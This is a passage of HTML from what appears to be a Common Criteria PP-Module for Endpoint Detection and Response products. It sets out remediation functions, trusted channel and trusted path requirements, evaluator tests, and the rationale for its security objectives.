+                      [<b>selection</b>: <i>logically quarantining the endpoint from the network unless allowlisted</i>, <i>quarantining the malicious file on the endpoint</i>] </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Terminate a running process on an endpoint </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">M<span class="tooltiptext">Mandatory</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr><tr><td> Retrieve potentially unauthorized or affected files from an endpoint </td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">O<span class="tooltiptext">Optional</span></div></td><td><div class="tooltipped">-<span class="tooltiptext">N/A</span></div></td></tr></table>
+              
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> This requirement captures all the remediation functionality
+                the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> provides the SOC Analyst and optionally the Administrator<a href="#period_220" id="period_220">. </a>                <p></p>Logically quarantine from the network refers to restricting communications from the endpoint to the rest of the network, 
+                it may include a restricted allowlist<a href="#period_221" id="period_221">. </a>               
+                <p></p>
+                Chart legend: M = Mandatory, O = Optional, - = N/A</span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div>The evaluator shall check to ensure that the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> describes what roles can perform what 
+                  remediation actions and how each remediation action is performed<a href="#period_222" id="period_222">. </a><p></p>
+                <div class="eacategory">Guidance</div>The evaluator shall review the operational guidance to verify that the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> has
+                  documented capabilities to perform the management functions<a href="#period_223" id="period_223">. </a><p></p>
+                <div class="eacategory">Tests</div>For each role, the evaluator shall perform the below tests, verifying that each role in the chart can 
+                  perform their permitted functions and are restricted from performing functions that they do not have access to per the 
+                  legend (Chart legend: X = Mandatory, O = Optional, - = N/A):
+                  <ul>
+                    <li><b>Test 1: </b>Conditional: If "logically quarantining the endpoint from the network unless allowlisted" is selected 
+                      the evaluator shall logically quarantine a managed endpoint system from the
+                    network and verify that the system is unable to access network addresses or resources
+                    outside of an allowlist<a href="#period_224" id="period_224">. </a></li>
+                    <li><b>Test 2: </b>Conditional: If "quarantining the malicious file on the endpoint" is selected 
+                      the evaluator shall verify the functionality to quarantine potentially unauthorized files on the endpoint<a href="#period_225" id="period_225">. </a></li>
+                    <li><b>Test 3: </b>The evaluator shall run an executable on a managed endpoint system, terminate
+                    its process from the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard, and then verify that the process is no
+                    longer running on the system<a href="#period_226" id="period_226">. </a></li>
+                    <li><b>Test 4: </b>The evaluator shall place a file known to trigger an incident alert on the file system then retrieve the 
+                      contents of the file from the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> management dashboard<a href="#period_227" id="period_227">. </a></li>
+                  </ul>
+                
+              </i></div></div>
+            </div></div>
+          </div>
+
+        <h3 class="indexable" data-level="3" id="fpt">5.2.4 Protection of the TSF (FPT)</h3>
+          
+        <div class="comp" id="FPT_ITT.1"><h4>FPT_ITT.1 Basic Internal TSF Data Transfer Protection</h4>
+            
+            <div class="element"><div class="reqid" id="FPT_ITT.1.1"><a class="abbr" href="#FPT_ITT.1.1">FPT_ITT.1.1</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b> <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall<b>
+                [<b>selection</b>: <ul><li><i>
+                    implement 
+                    [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> as defined in the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package</i>, <i><abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> as defined in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr></i>]</i>, </li><li><i>invoke platform-provided functionality for
+                   [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr></i>, <i><abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr></i>] 
+                 </i></li></ul>]
+                to</b> protect <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> data from [<i>modification, disclosure</i>] when it is transmitted between separate parts of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_228" id="period_228">. </a>
+              <div class="appnote"><span class="note-header">Application Note: </span><span class="note"> The intent of the above requirement is to use the
+                cryptographic protocols identified in the requirement to establish and maintain a
+                trusted channel between the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and the Host Agent, which are considered to be separate parts of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_229" id="period_229">. </a>The <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package permits the use of either <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> or <abbr class="dyn-abbr"><a href="#abbr_DTLS">DTLS</a></abbr><a href="#period_230" id="period_230">. </a>Only <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr>, <abbr class="dyn-abbr"><a href="#abbr_DTLS">DTLS</a></abbr>, or
+                <abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> can be used in this trusted channel<a href="#period_231" id="period_231">. </a><p></p>
+		      
+		      This requirement is to
+                ensure that the transmission of any logs, process lists, system information, etc,
+                when commanded, or at configurable intervals, is properly protected<a href="#period_232" id="period_232">. </a>This internal
+                channel also protects any commands and policies sent by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> to
+                the Host Agent<a href="#period_233" id="period_233">. </a>Either the Host Agent or the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> is able to
+                initiate the connection<a href="#period_234" id="period_234">. </a><p></p> 
+		      
+		      This internal channel protects both the
+                connection between an enrolled Host Agent and the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and the
+                connection between an unenrolled Host Agent and the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> during the
+                enrollment operation<a href="#period_235" id="period_235">. </a>Different protocols can be used for these two connections, and
+                the description in the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> should make this difference clear<a href="#period_236" id="period_236">. </a>                <p></p>
+		      
+		      The internal channel uses a protocol from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package or <abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> as the protocol that preserves
+                the confidentiality and integrity of <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> communications<a href="#period_237" id="period_237">. </a>The <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> author chooses the mechanism 
+                or mechanisms supported by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>, and then ensures the correct requirements are included in the 
+                <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> if not already present<a href="#period_238" id="period_238">. </a>Protocol, <abbr class="dyn-abbr"><a href="#abbr_RBG">RBG</a></abbr>, certificate validation,
+                algorithm, and similar services may be met with platform-provided services<a href="#period_239" id="period_239">. </a>
+        
+		    </span></div>
+
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+                
+
+             
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div> If "invoke platform-provided functionality for..." is selected, the evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> contains the calls to the platform that <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> is leveraging to invoke the functionality<a href="#period_240" id="period_240">. </a><br><br> 
+
+	
+			
+			If "implement..." is selected, the evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to verify how Agent-Server communications are protected is described and conforms to the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr><a href="#period_241" id="period_241">. </a>
+                  The evaluator shall also confirm that all protocols
+                  listed in the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> are consistent with those specified in the requirement, and are
+                  included in the requirements in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_242" id="period_242">. </a><p></p>
+                <div class="eacategory">Guidance</div> The evaluator shall confirm that the operational guidance contains
+                  instructions for configuring the communication channel between the Host Agent and
+                  the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> for each supported method<a href="#period_243" id="period_243">. </a>
+                <p></p>
+                <div class="eacategory">Tests</div>
+                  <ul>
+                    <li><b>Test 1: </b> The evaluators shall ensure that communications using each specified
+                        (in the operational guidance) Agent-Server communication method is tested
+                        during the course of the evaluation, setting up the connections as described
+                        in the operational guidance and ensuring that communication is successful<a href="#period_244" id="period_244">. </a></li>
+                    <li><b>Test 2: </b> The evaluator shall ensure, for each method of Agent-Server
+                        communication, the channel data is not sent in plaintext<a href="#period_245" id="period_245">. </a></li>
+                    </ul>
+                  
+              </i></div></div>
+            </div></div>
+          </div>
+      <h3 class="indexable" data-level="3" id="ftp">5.2.5 Trusted Path/Channels (FTP)</h3>
+          <div class="comp" id="FTP_TRP.1"><h4>FTP_TRP.1 Trusted Path</h4>
+            
+            <div class="element"><div class="reqid" id="FTP_TRP.1.1"><a class="abbr" href="#FTP_TRP.1.1">FTP_TRP.1.1</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall<b>
+                [<b>selection</b>: <ul><li><i>
+                    implement
+                    [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> as defined in the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package</i>, <i><abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> as defined in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr></i>]</i>, </li><li><i>invoke platform-provided functionality for
+                    [<b>selection</b>: <i><abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr></i>, <i><abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr></i>] 
+                  </i></li></ul>] to</b> provide a communication path between itself and [<i>remote</i>]
+                <b>administrators</b> that is logically distinct from other communication paths and
+                provides assured identification of its end points and protection of the communicated
+                data from [<i>modification, disclosure</i>]<a href="#period_246" id="period_246">. </a>            </div></div>
+            <div class="element"><div class="reqid" id="FTP_TRP.1.2"><a class="abbr" href="#FTP_TRP.1.2">FTP_TRP.1.2</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall<b> [<b>selection</b>: <i>implement functionality</i>, <i>invoke platform-provided functionality</i>] to</b> permit [<i>remote <b>administrators</b></i>] to initiate communication via the
+                trusted path<a href="#period_247" id="period_247">. </a>            </div></div>
+            <div class="element"><div class="reqid" id="FTP_TRP.1.3"><a class="abbr" href="#FTP_TRP.1.3">FTP_TRP.1.3</a></div><div class="reqdesc">
+              <b>Refinement:</b> The <b><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr></b> shall<b> [<b>selection</b>: <i>implement functionality</i>, <i>invoke platform-provided functionality</i>] to </b>require the use of the trusted path for [<i>all remote
+                administration actions</i>]<a href="#period_248" id="period_248">. </a>              <div class="appnote"><span class="note-header">Application Note: </span><span class="note">This requirement ensures that authorized remote
+                administrators initiate all communication with the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> via a
+                trusted path, and that all communications with the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> by remote
+                administrators is performed over this path<a href="#period_249" id="period_249">. </a>The data passed in this trusted
+                communication channel are encrypted as defined in the protocol chosen in the first
+                selection<a href="#period_250" id="period_250">. </a>The <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr> author chooses the mechanism or mechanisms
+                supported by the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr><a href="#period_251" id="period_251">. </a></span></div>
+              <div class="activity_pane hide"><div class="activity_pane_header"><a href="#" onclick="toggle(this);return false;"><span class="activity_pane_label"> Evaluation Activity </span><span class="toggler"></span></a></div><div class="activity_pane_body"><i>
+
+                <div class="eacategory"><abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr></div> The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to verify how remote administration communications are protected is described and conforms to the <abbr class="dyn-abbr"><a href="#abbr_SFR">SFR</a></abbr><a href="#period_252" id="period_252">. </a>
+                  The evaluator shall examine the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> to determine that the
+                  methods of remote <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> administration are indicated, along with
+                  how those communications are protected<a href="#period_253" id="period_253">. </a>The evaluator shall also confirm that all
+                  protocols listed in the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> in support of <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>
+                  administration are consistent with those specified in the requirement, and are
+                  included in the requirements in the <abbr class="dyn-abbr"><a href="#abbr_ST">ST</a></abbr><a href="#period_254" id="period_254">. </a>		      
+
+		    
+		      <br><br> If "invoke platform-provided functionality for..." is selected in <a href="#FTP_TRP.1.1">FTP_TRP.1.1</a>, the evaluator shall verify the <abbr class="dyn-abbr"><a href="#abbr_TSS">TSS</a></abbr> contains the calls to the platform that <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> is leveraging to invoke the functionality<a href="#period_255" id="period_255">. </a>
+	<p></p>
+                <div class="eacategory">Guidance</div> The evaluator shall confirm that the operational guidance contains
+                  instructions for establishing the remote administrative sessions for each
+                  supported method<a href="#period_256" id="period_256">. </a><p></p>
+                <div class="eacategory">Tests</div>
+                    <ul>
+                      <li><b>Test 1: </b> The evaluators shall ensure that communications using each specified
+                        (in the operational guidance) remote administration method is tested during
+                        the course of the evaluation, setting up the connections as described in the
+                        operational guidance and ensuring that communication is successful<a href="#period_257" id="period_257">. </a></li>
+                      <li><b>Test 2: </b> For each method of remote administration supported, the evaluator shall
+                        follow the operational guidance to ensure that there is no available
+                        interface that can be used by a remote user to establish remote
+                        administrative sessions without invoking the trusted path<a href="#period_258" id="period_258">. </a></li>
+                      <li><b>Test 3: </b> The evaluator shall ensure, for each method of remote administration,
+                        the channel data is not sent in plaintext<a href="#period_259" id="period_259">. </a></li>
+                    </ul>
+                  
+              </i></div></div>
+            </div></div>
+          </div>
+
+      <h2 class="indexable" data-level="2" id="obj-req-map">5.3 TOE Security Functional Requirements Rationale</h2><p>The following rationale provides justification for each security objective for the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>, 
+    showing that the SFRs are suitable to meet and achieve the security objectives:<br><table><tr><th>OBJECTIVE</th><th>ADDRESSED BY</th><th>RATIONALE</th></tr><tr class="major-row"><td rowspan="1"><a href="#O.ACCOUNTABILITY">O.ACCOUNTABILITY</a><br></td><td>
+            <a href="#FAU_GEN.1/EDR">FAU_GEN.1/EDR</a>, <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>
+          </td><td>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FAU_GEN.1/EDR">FAU_GEN.1/EDR</a> to ensure that the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> provides accountability through the generation of audit records for security-relevant events<a href="#period_260" id="period_260">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a> to provide a mechanism to authenticate management users so that they can be associated with their actions<a href="#period_261" id="period_261">. </a></td></tr><tr class="major-row"><td rowspan="1"><a href="#O.EDR_MANAGEMENT">O.EDR_MANAGEMENT</a><br></td><td><a href="#FAU_ALT_EXT.1">FAU_ALT_EXT.1</a>, <a href="#FAU_COL_EXT.1">FAU_COL_EXT.1</a>, <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a>, <a href="#FIA_PWD_EXT.1">FIA_PWD_EXT.1</a>, <a href="#FMT_SMF.1/ENDPOINT">FMT_SMF.1/ENDPOINT</a>, <a href="#FMT_SMF.1/HOST">FMT_SMF.1/HOST</a>, <a href="#FMT_SMR.1">FMT_SMR.1</a>, 
+            <a href="#FMT_SRF_EXT.1">FMT_SRF_EXT.1</a>, <a href="#FMT_TRM_EXT.1">FMT_TRM_EXT.1</a> (objective)</td><td>
+            The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FAU_ALT_EXT.1">FAU_ALT_EXT.1</a> to facilitate management by providing a function for authorized users to interact with security-relevant data that is provided to the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr><a href="#period_262" id="period_262">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FAU_COL_EXT.1">FAU_COL_EXT.1</a> to facilitate management by defining the security-relevant data that is collected by the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr><a href="#period_263" id="period_263">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FIA_AUT_EXT.1">FIA_AUT_EXT.1</a> to define how management users are authenticated by the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> to limit the subjects that can execute management functions on the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_264" id="period_264">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FIA_PWD_EXT.1">FIA_PWD_EXT.1</a> to define composition requirements for the Password Authentication Factor to ensure that an authorized user cannot access protected management functions without authorization<a href="#period_265" id="period_265">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FMT_SMF.1/ENDPOINT">FMT_SMF.1/ENDPOINT</a> to define the management functions that can be performed to control the behavior of the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> and the management roles that are authorized to perform those functions<a href="#period_266" id="period_266">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FMT_SMF.1/HOST">FMT_SMF.1/HOST</a> to define the management functions that can be performed to control the behavior of Host Agents that are connected to the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> and the management roles that are authorized to perform those functions<a href="#period_267" id="period_267">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FMT_SMR.1">FMT_SMR.1</a> to define the management roles that the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> supports so that its management functions can be separated by role<a href="#period_268" id="period_268">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FMT_SRF_EXT.1">FMT_SRF_EXT.1</a> to define the remediation functions that are available to authorized users to issue corrective actions on a system that has a connected Host Agent<a href="#period_269" id="period_269">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FMT_TRM_EXT.1">FMT_TRM_EXT.1</a> to provide an optional capability to ensure the integrity of management commands and policies issued to external Host Agents through use of a digital signature
+          </td></tr><tr class="major-row"><td rowspan="1"><a href="#O.PROTECTED_TRANSIT">O.PROTECTED_TRANSIT</a><br></td><td>FCS_DTLSS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_DTLSC_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_HTTPS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>), 
+            FCS_TLSC_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_TLSC_EXT.2 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), FCS_TLSS_EXT.1 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), 
+            FCS_TLSS_EXT.2 (from <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package), <a href="#FPT_ITT.1">FPT_ITT.1</a>, <a href="#FTP_TRP.1">FTP_TRP.1</a></td><td>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_HTTPS_EXT.1 from the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> for cases when <abbr class="dyn-abbr"><a href="#abbr_HTTPS">HTTPS</a></abbr> is used as a trusted communications channel<a href="#period_270" id="period_270">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_DTLSC_EXT.1 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when <abbr class="dyn-abbr"><a href="#abbr_DTLS">DTLS</a></abbr> as a client is used as a trusted communications channel<a href="#period_271" id="period_271">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_DTLSS_EXT.1 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when <abbr class="dyn-abbr"><a href="#abbr_DTLS">DTLS</a></abbr> as a server is used as a trusted communications channel<a href="#period_272" id="period_272">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_TLSC_EXT.1 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> as a client is used as a trusted communications channel<a href="#period_273" id="period_273">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_TLSC_EXT.2 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> uses a <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> client implementation that supports mutual authentication<a href="#period_274" id="period_274">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_TLSS_EXT.1 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> as a server is used as a trusted communications channel<a href="#period_275" id="period_275">. </a>            <br><br>The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> references FCS_TLSS_EXT.2 from the <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> Package for cases when the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> uses a <abbr class="dyn-abbr"><a href="#abbr_TLS">TLS</a></abbr> client implementation that supports mutual authentication<a href="#period_276" id="period_276">. </a>            <br><br> The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FPT_ITT.1">FPT_ITT.1</a> to define the internal trusted channel that the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr> uses to communicate with connected Host Agents as well as the communications protocols used to establish these trusted channels<a href="#period_277" id="period_277">. </a>            <br><br> The <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> includes <a href="#FTP_TRP.1">FTP_TRP.1</a> to define the communications protocols used to support secure remote administration of the <abbr class="dyn-abbr"><a href="#abbr_TSF">TSF</a></abbr><a href="#period_278" id="period_278">. </a>          </td></tr></table></p><h1 class="indexable" data-level="1" id="mod-conrat">6 Consistency Rationale</h1><h2 class="indexable" data-level="2" id="conrat-App">6.1 
+    Protection Profile for Application Software</h2><h3 class="indexable" data-level="3" id="contoe-App">6.1.1 
+	Consistency of TOE Type
+      </h3> If this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> is used to extend the Application Software <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr>, the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> type for
+        the overall <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> is still a software-based application<a href="#period_279" id="period_279">. </a>The <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> boundary is simply extended
+        to include the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> functionality that is built into the application so that additional
+        security functionality is claimed within the scope of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr><a href="#period_280" id="period_280">. </a><h3 class="indexable" data-level="3" id="consecprob-App">6.1.2 
+	Consistency of Security Problem Definition
+      </h3>
+      The threats, assumptions, and OSPs defined by this <abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> (see section 3.1) supplement those defined in the
+      App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> as follows:
+      <table><tr><th><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> Threat, Assumption, OSP</th><th>Consistency Rationale</th></tr><tr><td><a href="#T.MISCONFIGURATION">T.MISCONFIGURATION</a></td><td>This threat is consistent with the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> because it is a specific example of the T.LOCAL_ATTACK threat defined there<a href="#period_281" id="period_281">. </a>
+          In this case, the local attack is to maliciously alter the behavior of the application itself rather than to use the application as a method to attack the <abbr class="dyn-abbr"><a href="#abbr_OS">OS</a></abbr> platform<a href="#period_282" id="period_282">. </a></td></tr><tr><td><a href="#T.CREDENTIAL_REUSE">T.CREDENTIAL_REUSE</a></td><td>This threat is a specific example of T.NETWORK_EAVESDROP defined in the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr><a href="#period_283" id="period_283">. </a></td></tr><tr><td><a href="#A.CONNECTIVITY">A.CONNECTIVITY</a></td><td>This assumption is consistent with the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> because assuming network availability is consistent with the A.PLATFORM
+          assumption defined by the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>, which expects the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> to have a trustworthy computing platform<a href="#period_284" id="period_284">. </a></td></tr></table><h3 class="indexable" data-level="3" id="conobj-App">6.1.3 
+	Consistency of Objectives
+      </h3><p>
+	  The objectives for the TOEs are consistent with the App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> based on the following rationale:
+      <table><tr><th><abbr class="dyn-abbr"><a href="#abbr_PP-Module">PP-Module</a></abbr> <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> Objective</th><th>Consistency Rationale</th></tr><tr><td><a href="#O.ACCOUNTABILITY">O.ACCOUNTABILITY</a></td><td>This objective relates to the ability of the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> to identify and authenticate users, and
+            to record the behavior of these users<a href="#period_285" id="period_285">. </a>The <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr> does not define an authentication mechanism so this objective
+            does not affect the enforcement of the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>'s SFRs<a href="#period_286" id="period_286">. </a>          </td></tr><tr><td><a href="#O.EDR_MANAGEMENT">O.EDR_MANAGEMENT</a></td><td>This objective extends the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>'s O<a href="#period_287" id="period_287">. </a><abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr>.MANAGEMENT
+            objective by supporting the management functions that are specific to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr> type<a href="#period_288" id="period_288">. </a>          </td></tr><tr><td><a href="#O.PROTECTED_TRANSIT">O.PROTECTED_TRANSIT</a></td><td>This objective extends the <abbr class="dyn-abbr"><a href="#abbr_Base-PP">Base-PP</a></abbr>'s O.PROTECTED_COMMS
+            
+            objective by ensuring that the communications related to the <abbr class="dyn-abbr"><a href="#abbr_EDR">EDR</a></abbr> and
+            enrolled Host Agents are secured in the same manner as other sensitive data<a href="#period_289" id="period_289">. </a>          </td></tr></table></p><p>
+	  The objectives for the <abbr class="dyn-abbr"><a href="#abbr_TOE">TOE</a></abbr>'s Operational Environment are consistent with the App <abbr class="dyn-abbr"><a href="#abbr_PP">PP</a></abbr> based on the following rationale:
